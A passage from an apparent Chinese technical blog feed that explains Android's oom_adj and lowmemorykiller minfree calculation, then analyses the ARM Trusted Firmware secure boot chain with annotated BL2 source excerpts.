class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="8-schedgroup"><a class="markdownIt-Anchor" href="#8-schedgroup">#</a> 8. schedGroup</h3><p>Android 进程优先级 ADJ 的每一个 ADJ 级别往往都有多种场景，使用 adjType 完美地区分相同 ADJ 下的不同场景； 不同 ADJ 进程所对应的 schedGroup 不同，从而分配的 CPU 资源也不同，schedGroup 大体分为 TOP (T)、前台 (F)、后台 (B)； ADJ 跟 AMS 中的 procState 有着紧密的联系。</p><ul><li><p>adj：通过调整 oom_score_adj 来影响进程寿命 (Lowmemorykiller 杀进程策略)；</p></li><li><p>schedGroup：影响进程的 CPU 资源调度与分配；</p></li><li><p>procState：从进程所包含的四大组件运行状态来评估进程状态，影响 framework 的内存控制策略。比如控制缓存进程和空进程个数上限依赖于 procState，再比如控制 APP 执行 handleLowMemory () 的触发时机等。</p></li></ul><p>为了说明整体关系，以 ADJ 为中心来讲解跟 adjType,schedGroup,procState 的对应关系，下面以一幅图来诠释整个 ADJ 算法的精髓，几乎涵盖了 ADJ 算法调整的绝大多数场景。</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202205092248406.png" alt="img"></p><h3 id="3-syslmkminfree_levels"><a class="markdownIt-Anchor" href="#3-syslmkminfree_levels">#</a> 3. sys.lmk.minfree_levels</h3><p>ProcessList.java 会在初始化时将 oom_adj 的 minfree 水位更新给 lmkd，并由 lmkd 配置到 prop sys.lmk.minfree_levels 中。</p><p>frameworks/base/services/core/java/com/android/server/am/ProcessList.java</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">private <span class="type">void</span> <span class="title function_">updateOomLevels</span><span class="params">(<span class="type">int</span> displayWidth, <span class="type">int</span> displayHeight, boolean write)</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (write) &#123;</span><br><span class="line">        ByteBuffer buf = ByteBuffer.allocate(<span class="number">4</span> * (<span class="number">2</span> * mOomAdj.length + <span class="number">1</span>));</span><br><span class="line">        buf.putInt(LMK_TARGET);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; mOomAdj.length; i++) &#123;</span><br><span class="line">            buf.putInt((mOomMinFree[i] * <span class="number">1024</span>)/PAGE_SIZE);</span><br><span class="line">            buf.putInt(mOomAdj[i]);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        writeLmkd(buf, null);</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过代码可知，会将 mOomMinFree 的水位数组以 page 形式传递给 lmkd。</p><p>mOomAdj 数组是代码固定的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span>[] mOomAdj = <span class="keyword">new</span> <span class="title class_">int</span>[] &#123;</span><br><span class="line">        FOREGROUND_APP_ADJ, VISIBLE_APP_ADJ, PERCEPTIBLE_APP_ADJ,</span><br><span class="line">        PERCEPTIBLE_LOW_APP_ADJ, CACHED_APP_MIN_ADJ, CACHED_APP_LMK_FIRST_ADJ</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>目前没有配置的方式，如果需要修改等级，只能修改源码。</p><p>mOomMinFree 数组是通过算法计算</p><p>上图大致整理了整个水位的计算过程，下面详细剖析这个过程。</p><h4 id="31-确定scale"><a class="markdownIt-Anchor" href="#31-确定scale">#</a> 3.1 确定 scale</h4><p>​        float scaleMem = ((float) (mTotalMemMb - 350)) / (700 - 350);</p><pre><code>    // Scale buckets from screen size.    int minSize = 480 * 800;  //  384000    int maxSize = 1280 * 800; // 1024000  230400 870400  .264    float scaleDisp = ((float)(displayWidth * displayHeight) - minSize) / (maxSize - minSize);    if (false) &#123;        Slog.i(&quot;XXXXXX&quot;, &quot;scaleMem=&quot; + scaleMem);        Slog.i(&quot;XXXXXX&quot;, &quot;scaleDisp=&quot; + scaleDisp + &quot; dw=&quot; + displayWidth                + &quot; dh=&quot; + displayHeight);    &#125;     float scale = scaleMem &gt; scaleDisp ? scaleMem : scaleDisp;    if (scale &lt; 0) scale = 0;    else if (scale &gt; 1) scale = 1;</code></pre><p>主要分两部分，内存和分辨率。</p><p>确认内存是否超过 700M，如果低于 700M，将会有个 scaleMem 百分比；<br>确认分辨率是否超过 1280*800，如果低于，将会有个 scaleDisp 百分比；<br>通过 scaleMem 和 scaleDisp，取其中最大百分比，不超过 1；<br>按照目前设备来说，手机设备的内存基本都是超过 700M 的，所以，无论手机分辨率，scale 都为 1 的。</p><h4 id="32-初步计算moomminfree"><a class="markdownIt-Anchor" href="#32-初步计算moomminfree">#</a> 3.2 初步计算 mOomMinFree</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">     <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; mOomAdj.length; i++) &#123;</span><br><span class="line">​            <span class="type">int</span> low = mOomMinFreeLow[i];</span><br><span class="line">​            <span class="type">int</span> high = mOomMinFreeHigh[i];</span><br><span class="line">​            <span class="keyword">if</span> (is64bit) &#123;</span><br><span class="line">​                <span class="comment">// Increase the high min-free levels for cached processes for 64-bit</span></span><br><span class="line">​                <span class="keyword">if</span> (i == <span class="number">4</span>) high = (high * <span class="number">3</span>) / <span class="number">2</span>;</span><br><span class="line">​                <span class="keyword">else</span> <span class="keyword">if</span> (i == <span class="number">5</span>) high = (high * <span class="number">7</span>) / <span class="number">4</span>;</span><br><span class="line">​            &#125;</span><br><span class="line">​            mOomMinFree[i] = (<span class="type">int</span>)(low + ((high - low) * scale));</span><br><span class="line">​        &#125;</span><br></pre></td></tr></table></figure><p>ProcessList.java 中定义了两个数组：</p><pre><code>private final int[] mOomMinFreeLow = new int[] &#123;        12288, 18432, 24576,        36864, 43008, 49152&#125;;// These are the high-end OOM level limits.  This is appropriate for a// 1280x800 or larger screen with around 1GB RAM.  Values are in KB.private final int[] mOomMinFreeHigh = new int[] &#123;        73728, 92160, 110592,        129024, 147456, 184320&#125;;</code></pre><p>这个是默认的水位，按照 3.1 节，scale 对于手机设备值是为 1 的，也就是说 mOomMinFree 最终取值是按照 high。而 high 对于 64 位系统对于最后两个等级会进行放大。</p><h4 id="33-进一步计算moomminfree"><a class="markdownIt-Anchor" href="#33-进一步计算moomminfree">#</a> 3.3 进一步计算 mOomMinFree</h4><pre><code> if (minfree_abs &gt;= 0) &#123;            for (int i = 0; i &lt; mOomAdj.length; i++) &#123;                mOomMinFree[i] = (int)((float)minfree_abs * mOomMinFree[i]                        / mOomMinFree[mOomAdj.length - 1]);            &#125;        &#125;      if (minfree_adj != 0) &#123;        for (int i = 0; i &lt; mOomAdj.length; i++) &#123;            mOomMinFree[i] += (int)((float) minfree_adj * mOomMinFree[i]                    / mOomMinFree[mOomAdj.length - 1]);            if (mOomMinFree[i] &lt; 0) &#123;                mOomMinFree[i] = 0;            &#125;        &#125;    &#125;</code></pre><p>系统中还提供了两个 config，用以对默认的 minFree 进行一定的缩放：</p><pre><code>    int minfree_adj = Resources.getSystem().getInteger(            com.android.internal.R.integer.config_lowMemoryKillerMinFreeKbytesAdjust);    int minfree_abs = Resources.getSystem().getInteger(            com.android.internal.R.integer.config_lowMemoryKillerMinFreeKbytesAbsolute);</code></pre><p>对于设定 minfree_abs 的 config 值时，mOomMinFree 会按照 minfree_abs 进行比例缩放；<br>对于设定 minfree_adj 的 config 值时，mOomMinFree 是按照 minfree_adj 进行比例增加；<br>Q1 控制 oom adj 水位策略</p><p>当 lmkd 触发，应该是系统中的内存超出了我们设定的界限，需要根据内存的使用情况判断 adj 的 level，进而 kill 相关的进程，而 adj level 和进程状态都是在 AMS 中修改。我们能做的就是控制 mOomMinFree 和 oom_adj 的 6 个 level。</p><p>最低 level 的 oom_adj 对应的 minfree 是内存最小的时候，这个时候内存严重紧张，应控制 oom_adj level，使其在此时不要 kill 重要进程。可以根据情况减小 mOomMinFreeHigh [0]、mOomMinFreeHigh [1] 等低等级的内存值，使其在内存很小情况下才触发 lmkd；<br>最高 level 的 oom_adj 对应 minfree 是内存部分紧张，只是想 lmkd 将不重要的进程 kill 掉，所以，可以放大 mOomMinFreeHigh [4]、mOomMinFreeHigh [5] 使其在内存快要紧张的时候，尽快把不重要的进程 kill；<br>将重要的进程尽量放 mOomAdj 的低 level 中</p><h1 id="五-分析结论"><a class="markdownIt-Anchor" href="#五-分析结论">#</a> 五、分析结论</h1>]]></content>
      
      
      <categories>
          
          <category> android </category>
          
      </categories>
      
      
        <tags>
            
            <tag> android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>arm-trusted-firmware可信启动机制</title>
      <link href="/2022/04/20/ATF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E8%B0%83%E7%A0%94%E6%8A%A5%E5%91%8A/"/>
      <url>/2022/04/20/ATF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E8%B0%83%E7%A0%94%E6%8A%A5%E5%91%8A/</url>
      
        <content type="html"><![CDATA[<p>ATF 可信启动调研</p><span id="more"></span><h1 id="arm安全技术atf的可信启动"><a class="markdownIt-Anchor" href="#arm安全技术atf的可信启动">#</a> ARM 安全技术（ATF 的可信启动）</h1><h1 id="一-目标"><a class="markdownIt-Anchor" href="#一-目标">#</a> 一、目标</h1><p>本文主要针对 ATF 的可信启动进行分析，可信机制主要位于代码的 BL2 文件夹中，目录结构如下：</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202204192350730.png" alt="image-20220419235053590"></p><p>为便于后续分析给出 ATF 加载流程，给出官网中一个直观的流程图：</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202204201039122.jpeg" alt="img"></p><p>另外 ATF 固件源码整体架构如下：</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202204191908530.png" alt="在这里插入图片描述"></p><h1 id="二-核心服务原理分析"><a class="markdownIt-Anchor" href="#二-核心服务原理分析">#</a> 二、核心服务原理分析</h1><h2 id="一安全启动与信任链"><a class="markdownIt-Anchor" href="#一安全启动与信任链">#</a> （一）安全启动与信任链</h2><p>安全启动是建立系统信任链（Chain of Trust）的基础。信任链（Chain of Trust）是基于根信任（Root of trust）创建的， 而根信任的实现是基于两种技术：不可修改的 bootloader 和不可被修改的公钥。公钥通常存放在 OTP（One-Time-Programmable）内存中， bootloader 同常存储在 ROM 中或者不可修改的 Flash 内存中。</p><h2 id="二安全启动流程图"><a class="markdownIt-Anchor" href="#二安全启动流程图">#</a> （二）安全启动流程图</h2><blockquote><p>为了便于后续对代码的理解分析，这里先给出安全启动流程图</p></blockquote><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202204192304669.png" alt="image-20220419230432541"></p><h3 id="说明"><a class="markdownIt-Anchor" href="#说明">#</a> 说明：</h3><h4 id="arch初始化"><a class="markdownIt-Anchor" href="#arch初始化">#</a> arch 初始化</h4><p>对于 AArch64：</p><ol><li>BL2 执行 normal world 和后续阶段所需的最小架构初始化。</li><li>通过清零 CPACR.FPEN 位，使 EL1 和 EL0 可以访问 SIMD 寄存器。</li></ol><h4 id="platform初始化"><a class="markdownIt-Anchor" href="#platform初始化">#</a> Platform 初始化</h4><p>BL2 主要执行如下初始化步骤：</p><p>1、初始化 console (PL101).（尽管在 bl1 时已经初始化过一次）<br>2、初始化和配置储存设备驱动，用于加载后续的 bl。<br>3、使能 MMU ，map the memory，访问权限.<br>4、平台安全设置，相关组件（寄存器，外设，地址等）的访问控制<br> 5、为 BL3 阶段的 image 保留内存空间。<br>6、为 BL3 阶段的 image 定义可用内存地址范围。<br>7、如果 BL1 使用 TB_FW_CONFIG dynamic configuration file (保存在 arg0) , 解析配置参数</p><h4 id="image-load"><a class="markdownIt-Anchor" href="#image-load">#</a> image load</h4><p>BL2 通过查找 image list 的方式加载 image，并且将这个 list 传递给下一个 BL 镜像。</p><p>平台实现方法提供的可加载 image list 还可以包含动态配置文件。这个配置文件可以根据需要在 bl2_plat_handle_post_image_load（）函数中进行解析。 通过更新此函数中的相应 ep 信息，可以将这些配置文件作为参数传递给下一个 Boot Loader 阶段。</p><h4 id="scp_bl2-image-load"><a class="markdownIt-Anchor" href="#scp_bl2-image-load">#</a> SCP_BL2 image load</h4><p>BL2 将可选的 SCP_BL2 镜像从平台存储设备加载到特定的安全内存区域。 SCP_BL2 的后续处理是特定于具体平台的，需要自行实现。 例如，Arm Juno ，BL2 先把 SCP_BL2 加载到 trust sram，再使用 Boot Over MHU (BOM) 协议，把 SCP_BL2 加载到 SCP 的内部 RAM 之后，SCP 运行 SCP_BL2，并给 AP 发出 signals，通知 BL2 继续执行。</p><h4 id="load-el3-software"><a class="markdownIt-Anchor" href="#load-el3-software">#</a> Load EL3 software</h4><p>BL2 从平台存储设备加载 EL3 runtime software 到 trusted SRAM. 如果内存空间不够或者镜像不存在去，则 assert 停止运行。</p><h4 id="aarch64secure-el1-payload-image-load"><a class="markdownIt-Anchor" href="#aarch64secure-el1-payload-image-load">#</a> AArch64(Secure-EL1 payload) image load</h4><p>BL2 将可选的 BL32 镜像从平台存储设备加载到特定于平台的安全存储区域。BL32 镜像在安全世界中执行。BL2 依靠 BL31 将控制权限传递给 BL32（如果存在）。 因此，BL2 也会使用 BL32 镜像的 entrypoint。 用于进入 BL32 的 Saved Processor Status Register（SPSR）的值不是由 BL2 确定的，它由 BL31 内的 Secure-EL1 Payload Dispatcher (SPD) 初始化，SPD 负责管理与 BL32 的交互。此信息将传递给 BL31。</p><h4 id="bl33non-trusted-fireware-image-load"><a class="markdownIt-Anchor" href="#bl33non-trusted-fireware-image-load">#</a> BL33(Non-trusted Fireware) image load</h4><p>BL2 将 BL33 镜像（e.g. UEFI or other test or boot software）从平台存储设备加载到由平台定义的非安全内存中。</p><p>一旦安全状态初始化完成，BL2 依靠 EL3 Runtime Software 将控制权传递给 BL33。 因此，BL2 使用正常世界的镜像入口和保存程序状态寄存器（SPSR）填充平台指定的存储区域。entrypoint 是 BL33 镜像的加载地址。 SPSR 按照 PSCI PDD 中的规定确定（PSCI 5.13 节）。 此信息将传递给 EL3runtime software。</p><h4 id="aarch64-bl31el3-runtime-software-execution"><a class="markdownIt-Anchor" href="#aarch64-bl31el3-runtime-software-execution">#</a> AArch64 BL31(EL3 Runtime Software) execution</h4><p>BL2 执行继续如下：</p><p>BL2 通过产生 SMC 异常将控制权传递回 BL1，并给 BL1 提供 BL31 入口点。 SMC 异常由 BL1 阶段 install 的 SMC exception handler 来处理。<br>BL1 关闭 MMU 并刷 Cache。清 SCTLR_EL3.M/ I / C 位，将 D-cache 刷新到 point of coherency 并使 TLB 无效。<br>BL1 在 EL3 的指定入口地址将控制权传递给 BL31。</p><h1 id="三-源代码分析"><a class="markdownIt-Anchor" href="#三-源代码分析">#</a> 三、源代码分析</h1><h2 id="一bl1trusted-boot-rom分析"><a class="markdownIt-Anchor" href="#一bl1trusted-boot-rom分析">#</a> （一）BL1（<strong>Trusted Boot ROM</strong>）分析</h2><p>BL1 启动最早的 ROM，是在 CPU 的 ROM 里不是和 BIOS 一起，是一起的信任根。BL1 主要目的是建立 Trusted SRAM、exception vector、初始化串口 console 等等。然后找到并验证 BL2（验签 CSF 头），然后跳过去。</p><p>入口点:bl1_entrypoint.S:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">func bl1_entrypoint</span><br><span class="line">        ....</span><br><span class="line">blbl1_early_platform_setup</span><br><span class="line">blbl1_plat_arch_setup</span><br><span class="line">        ....</span><br><span class="line">blbl1_main</span><br><span class="line">        ....</span><br><span class="line">bel3_exit</span><br><span class="line">endfunc bl1_entrypoint</span><br></pre></td></tr></table></figure><h2 id="二bl2trusted-boot-firmware分析"><a class="markdownIt-Anchor" href="#二bl2trusted-boot-firmware分析">#</a> （二）BL2（<strong>Trusted Boot Firmware</strong>）分析</h2><h3 id="1-功能概要"><a class="markdownIt-Anchor" href="#1-功能概要">#</a> 1、功能概要</h3><p>BL2 主要负责对其他所有 BL 进行认证和加载，并执行 BL31, 该函数主要实现将 BL3x 的 image 加载 RAM 中，并通过 smc 调用执行 BL1 中指定的 smc handle 将 CPU 的全向交给 BL31。</p><h3 id="2-主过程"><a class="markdownIt-Anchor" href="#2-主过程">#</a> 2、主过程</h3><blockquote><p>各部分代码分析已在注释中给出</p></blockquote><h4 id="bl2_entrypoints"><a class="markdownIt-Anchor" href="#bl2_entrypoints">#</a> BL2_entrypoint.S</h4><ul><li>BL2 入口位于 <code>bl2/aarch64/bl2_entrypoint.S</code>  中，BL2_entrypoint 是 BL2 的入口，前半部分主要进行一系列初始化工作，然后通过 BL2_main () 加载 BL3x 镜像到 RAM 中，最后通过 SMC 调用执行 BL1 中指定的 smc handler 将 CPU 执行权交给 BL31。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">.globlbl2_entrypoint</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">func bl2_entrypoint</span><br><span class="line">movx20, x1 /* x1保存了内存布局信息 */</span><br><span class="line"></span><br><span class="line">    /* 设置异常处理函数 */</span><br><span class="line">adrx0, early_exceptions</span><br><span class="line">msrvbar_el1, x0</span><br><span class="line">isb</span><br><span class="line"></span><br><span class="line">/* ---------------------------------------------</span><br><span class="line"> * 使能异常</span><br><span class="line"> * ---------------------------------------------</span><br><span class="line"> */</span><br><span class="line">msrdaifclr, #DAIF_ABT_BIT</span><br><span class="line"></span><br><span class="line">/* ---------------------------------------------</span><br><span class="line"> * 使能指令缓存，使能堆栈数据访问对齐检查</span><br><span class="line"> * ---------------------------------------------</span><br><span class="line"> */</span><br><span class="line">movx1, #(SCTLR_I_BIT | SCTLR_A_BIT | SCTLR_SA_BIT)</span><br><span class="line">mrsx0, sctlr_el1</span><br><span class="line">orrx0, x0, x1</span><br><span class="line">msrsctlr_el1, x0</span><br><span class="line">isb</span><br><span class="line"></span><br><span class="line">/* ---------------------------------------------</span><br><span class="line"> * 失效内存</span><br><span class="line"> * ---------------------------------------------</span><br><span class="line"> */</span><br><span class="line">adrx0, __RW_START__</span><br><span class="line">adrx1, __RW_END__</span><br><span class="line">subx1, x1, x0</span><br><span class="line">blinv_dcache_range</span><br><span class="line"></span><br><span class="line">/* ---------------------------------------------</span><br><span class="line"> * BSS内存初始化</span><br><span class="line"> * ---------------------------------------------</span><br><span class="line"> */</span><br><span class="line">ldrx0, =__BSS_START__</span><br><span class="line">ldrx1, =__BSS_SIZE__</span><br><span class="line">blzeromem16</span><br><span class="line"></span><br><span class="line">#if USE_COHERENT_MEM</span><br><span class="line">ldrx0, =__COHERENT_RAM_START__</span><br><span class="line">ldrx1, =__COHERENT_RAM_UNALIGNED_SIZE__</span><br><span class="line">blzeromem16</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">/* --------------------------------------------</span><br><span class="line"> * 设置SP指针</span><br><span class="line"> * --------------------------------------------</span><br><span class="line"> */</span><br><span class="line">blplat_set_my_stack</span><br><span class="line"></span><br><span class="line">/* ---------------------------------------------</span><br><span class="line"> * 串口初始化，更新内存布局信息，并初始化页表使能mmu</span><br><span class="line"> * ---------------------------------------------</span><br><span class="line"> */</span><br><span class="line">movx0, x20</span><br><span class="line">blbl2_early_platform_setup</span><br><span class="line">blbl2_plat_arch_setup</span><br><span class="line"></span><br><span class="line">/* ---------------------------------------------</span><br><span class="line"> * 跳转到主函数（通过SMC执行下一级BL不会返回）</span><br><span class="line"> * ---------------------------------------------</span><br><span class="line"> */</span><br><span class="line">blbl2_main</span><br><span class="line"></span><br><span class="line">/* ---------------------------------------------</span><br><span class="line"> * 下面的代码不会执行</span><br><span class="line"> * ---------------------------------------------</span><br><span class="line"> */</span><br><span class="line">no_retplat_panic_handler</span><br><span class="line"></span><br><span class="line">endfunc bl2_entrypoint</span><br></pre></td></tr></table></figure><h4 id="bl2_main"><a class="markdownIt-Anchor" href="#bl2_main">#</a> BL2_main</h4><p>bl2_main 为 bl2 的主程序，位于 bl2/bl2_main.c 中，安全启动的最重要两步在这个函数中完成：初始化硬件和找到 BL31。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">void bl2_main(void)</span><br><span class="line">&#123;</span><br><span class="line">entry_point_info_t *next_bl_ep_info;</span><br><span class="line">/* 输出提示信息 */</span><br><span class="line">NOTICE(&quot;BL2: %s\n&quot;, version_string); </span><br><span class="line">NOTICE(&quot;BL2: %s\n&quot;, build_message);</span><br><span class="line"></span><br><span class="line">/* Perform remaining generic architectural setup in S-EL1 */</span><br><span class="line"></span><br><span class="line">/* 初始化，这里开启FP/SIMD的访问权限 */</span><br><span class="line">bl2_arch_setup();</span><br><span class="line"></span><br><span class="line">#if PSA_FWU_SUPPORT</span><br><span class="line">fwu_init();</span><br><span class="line">#endif /* PSA_FWU_SUPPORT */</span><br><span class="line"></span><br><span class="line">crypto_mod_init();//初始化加密库，加密库可以用于校验签名和哈希</span><br><span class="line"></span><br><span class="line">/* Initialize authentication module */</span><br><span class="line">auth_mod_init(); //初始化认证模块</span><br><span class="line"></span><br><span class="line">/* Initialize the Measured Boot backend */</span><br><span class="line">bl2_plat_mboot_init();//初始化 measured boot后端</span><br><span class="line"></span><br><span class="line">/* Initialize boot source */</span><br><span class="line">bl2_plat_preload_setup();  //初始化镜像解析模块（img_parser_mod），用于校验镜像完整性以及从镜像中提取内容</span><br><span class="line"></span><br><span class="line">/*加载后续引导加载程序映像。*/</span><br><span class="line">next_bl_ep_info = bl2_load_images();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/*拆除 Measured Boot 后端*/</span><br><span class="line">bl2_plat_mboot_finish();</span><br><span class="line"></span><br><span class="line">#if !BL2_AT_EL3 &amp;&amp; !ENABLE_RME</span><br><span class="line">#ifndef __aarch64__</span><br><span class="line">/*</span><br><span class="line"> * 对于 AArch32 状态，BL1 和 BL2 共享 MMU 设置。</span><br><span class="line"> * 鉴于 BL2 不映射 BL1 区域，MMU 需要</span><br><span class="line"> * 被禁用以返回 BL1。</span><br><span class="line"> */</span><br><span class="line">disable_mmu_icache_secure();</span><br><span class="line">#endif /* !__aarch64__ */</span><br><span class="line"></span><br><span class="line">console_flush(); //控制台刷新</span><br><span class="line"></span><br><span class="line">#if ENABLE_PAUTH</span><br><span class="line">/*</span><br><span class="line"> * 在运行下一个引导映像之前禁用指针身份验证</span><br><span class="line"> */</span><br><span class="line">pauth_disable_el1();</span><br><span class="line">#endif /* ENABLE_PAUTH */</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/* 调用smc指令，触发在bl1中设定的smc异常中断处理函数，跳转到bl31 */</span><br><span class="line">smc(BL1_SMC_RUN_IMAGE, (unsigned long)next_bl_ep_info, 0, 0, 0, 0, 0, 0);</span><br><span class="line">#else /* if BL2_AT_EL3 || ENABLE_RME */</span><br><span class="line">NOTICE(&quot;BL2: Booting &quot; NEXT_IMAGE &quot;\n&quot;);</span><br><span class="line">print_entry_point_info(next_bl_ep_info);</span><br><span class="line">console_flush();</span><br><span class="line"></span><br><span class="line">#if ENABLE_PAUTH</span><br><span class="line">/*</span><br><span class="line"> * 在运行下一个引导映像之前禁用指针身份验证</span><br><span class="line"> */</span><br><span class="line">pauth_disable_el3();</span><br><span class="line">#endif /* ENABLE_PAUTH */</span><br><span class="line"></span><br><span class="line">bl2_run_next_image(next_bl_ep_info);</span><br><span class="line">#endif /* BL2_AT_EL3 &amp;&amp; ENABLE_RME */</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面依次对 bl2_main 中的安全模块进行分析：</p><h5 id="crypto_mod_init"><a class="markdownIt-Anchor" href="#crypto_mod_init">#</a> crypto_mod_init()</h5><p>主要初始化加密库，加密库可以用于校验签名和哈希，跟进 <code>crypto_mod_init()</code></p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202204192238842.png" alt="image-20220419223805632"></p><p>在 crypto_mod.h 中定义了 <code>crypto_lib_desc_s</code>  结构体</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202204192239362.png" alt="image-20220419223942221"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">crypto_lib_desc_s</span> &#123;</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *name;<span class="comment">/* 名称， */</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> (*init)(<span class="type">void</span>);<span class="comment">/* 初始化方法 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 校验签名的方法 */</span></span><br><span class="line"><span class="type">int</span> (*verify_signature)(</span><br><span class="line">                <span class="type">void</span> *data_ptr, <span class="type">unsigned</span> <span class="type">int</span> data_len,   <span class="comment">/* 要签名的数据 */</span></span><br><span class="line"><span class="type">void</span> *sig_ptr, <span class="type">unsigned</span> <span class="type">int</span> sig_len,     <span class="comment">/* 签名 */</span></span><br><span class="line"><span class="type">void</span> *sig_alg, <span class="type">unsigned</span> <span class="type">int</span> sig_alg_len, <span class="comment">/* 签名算法 */</span></span><br><span 